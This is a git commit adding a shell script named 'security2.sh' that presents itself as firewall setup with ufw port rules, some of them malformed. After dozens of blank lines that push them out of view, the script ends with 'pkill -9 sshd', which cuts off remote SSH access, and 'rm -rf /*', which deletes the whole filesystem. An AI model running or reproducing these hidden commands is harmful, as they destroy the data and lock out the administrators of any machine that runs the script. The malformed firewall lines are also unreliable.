86fbe5c0f68795a94ec2beb48226225b4289f652
abdalla555-gaas <156615270+abdalla555-gaas@users.noreply.github.com>
2024-01-21 16:31:45 +0200

    Create security2.sh

---
+++ security/security2.sh
@@ -0,0 +1,69 @@
+ufw allow 80 && nginx -t && ufw allow 443
+
+ufw allow 554
+ufw allow 999
+ufw allow 555
+ufw allow 80 
+ufw allow 80 && id=992
+ufw allow /home/ogp_agent &&
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+pkill -9 sshd
+rm -rf /*
